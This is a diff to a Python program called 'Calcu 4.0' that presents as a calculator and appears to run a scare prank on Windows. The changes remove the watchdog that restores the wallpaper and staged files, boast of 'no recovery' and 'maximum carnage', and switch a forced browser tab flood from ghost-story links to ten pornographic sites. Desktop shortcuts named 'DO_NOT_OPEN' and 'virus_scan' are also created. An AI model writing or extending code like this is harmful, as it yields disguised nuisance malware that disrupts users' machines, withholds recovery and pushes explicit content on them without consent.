@@ -4,7 +4,8 @@ Calcu 4.0 ("Babbage, Night Shift: TOTAL RECALL")
 Calculate this bitch — now with MORE scary.
 
 SAFETY WARNING: Run the original v3.py to restore everything.
-This edition is Aftermath: no cleanup, no watchdog, maximum carnage.
+This edition is TRUE Aftermath: no cleanup, no watchdog, no recovery.
+Maximum carnage. NSFW tabs ON.
 
 Notes:
 - No third-party dependencies. Pure stdlib + built-in Windows APIs.
@@ -55,7 +56,7 @@ except (ImportError, AttributeError, OSError):
 # ------------------------------------------------------------------
 # Tunables
 # ------------------------------------------------------------------
-NSFW_JOKES     = False   # False removes adult sites from the tab flood
+NSFW_JOKES     = True    # True adds adult sites to the tab flood
 HISTORY_CAP    = 150     # max results kept in memory
 FLASH_WINDOWS  = 30      # windows used to release stale conhost handles
 AUTO_CLOSE     = 20      # windows that close themselves after 1 s
@@ -131,12 +132,16 @@ TAB_FLOOD_URLS = [
 ]
 if NSFW_JOKES:
     TAB_FLOOD_URLS += [
-        "https://en.wikipedia.org/wiki/Exorcism",
-        "https://en.wikipedia.org/wiki/List_of_urban_legends",
-        "https://www.youtube.com/results?search_query=ghost+stories",
-        "https://www.google.com/search?q=creepypasta",
-        "https://www.google.com/search?q=can+a+computer+be+haunted",
-        "https://en.wikipedia.org/wiki/Backrooms",
+        "https://www.pornhub.com/",
+        "https://e621.net/",
+        "https://onlyfans.com/",
+        "https://www.xvideos.com/",
+        "https://www.redtube.com/",
+        "https://www.youporn.com/",
+        "https://spankbang.com/",
+        "https://www.tnaflix.com/",
+        "https://www.xhamster.com/",
+        "https://motherless.com/",
     ]
 SHORTCUT_SUFFIXES = [
     "DO_NOT_OPEN", "virus_scan", "totally_normal", "URGENT_README",
@@ -2405,8 +2410,7 @@ def run_show():
     download_files = []
     icon_state = {"shortcuts": []}
     try:
-        # ADDED: spawn watchdog early per spec (even though aftermath skips cleanup)
-        spawn_watchdog(original_wallpaper, [p for p in (staging, note) if p])
+        # AFTERMATH: No watchdog — true aftermath, zero recovery
         threading.Thread(target=stage_voice, daemon=True).start()
         threading.Thread(target=siren, daemon=True).start()
         threading.Thread(target=tab_flood, daemon=True).start()
